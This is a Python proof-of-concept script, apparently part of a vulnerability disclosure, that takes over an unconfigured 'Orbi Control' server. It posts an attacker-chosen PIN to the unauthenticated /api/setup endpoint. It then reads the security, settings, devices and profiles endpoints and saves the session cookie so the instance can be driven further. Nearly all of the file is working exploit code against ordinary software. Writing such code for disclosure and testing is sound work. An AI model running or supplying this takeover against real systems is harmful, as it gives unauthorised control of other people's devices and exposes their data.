#!/usr/bin/env python3
"""LIVE PoC 1 — take over a real, unconfigured Orbi Control instance over HTTP.

Use: python3 poc1_live_setup_takeover.py http://<host>:8470 --confirm [--pin PIN]

This talks to an actual running server (not a mock). It only succeeds while the
target is in first-run state; a configured instance returns 409. With --pin-supplied
it saves the session cookie so you can drive the authenticated API afterwards.
"""
import argparse
import http.cookiejar
import json
import urllib.error
import urllib.request

from live_common import confirm_arg, require_confirm


def call(base, path, payload=None, opener=None):
    data = json.dumps(payload).encode() if payload is not None else None
    req = urllib.request.Request(base.rstrip("/") + path, data=data,
                                 headers={"Content-Type": "application/json"} if data else {})
    return (opener.open(req, timeout=10) if opener else urllib.request.urlopen(req, timeout=10))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base_url", help="e.g. http://192.168.1.50:8470")
    ap.add_argument("--pin", default="ATTACKER123")
    ap.add_argument("--cookie-file", help="save the session cookie jar here")
    confirm_arg(ap, "set the PIN of the target instance")
    args = ap.parse_args()
    require_confirm(args)

    jar = http.cookiejar.MozillaCookieJar()
    attacker = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    before = json.load(call(args.base_url, "/api/session", opener=attacker))
    print(f"[*] target /api/session: pin_set={before['pin_set']} "
          f"authenticated={before['authenticated']}")
    if before["pin_set"]:
        print("[!] target already configured — PoC 1 only applies to first-run state; "
              "use PoC 3/4 on a configured machine")
        return 2

    result = json.load(call(args.base_url, "/api/setup", {"pin": args.pin}, opener=attacker))
    print(f"[+] POST /api/setup {{pin: {args.pin!r}}} -> {result}")
    print(f"[+] session cookies: {[(c.name, c.value[:8] + '...') for c in jar]}")

    for path in ("/api/security", "/api/settings", "/api/devices", "/api/profiles"):
        try:
            body = json.load(call(args.base_url, path, opener=attacker))
            summary = body if not isinstance(body, dict) else {k: (str(v)[:80]) for k, v in body.items()}
            print(f"[+] GET {path} (authenticated): {summary}")
        except urllib.error.HTTPError as e:
            print(f"[-] GET {path}: HTTP {e.code}")

    after = json.load(call(args.base_url, "/api/session", opener=attacker))
    print(f"[+] target /api/session after setup: {after}")
    assert list(jar), "no session cookie was issued"
    if args.cookie_file:
        jar.save(args.cookie_file, ignore_expires=True, ignore_discard=True)
        print(f"[+] cookies saved to {args.cookie_file}")
    print("[+] CONFIRMED: unauthenticated caller set the PIN and now controls the instance")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
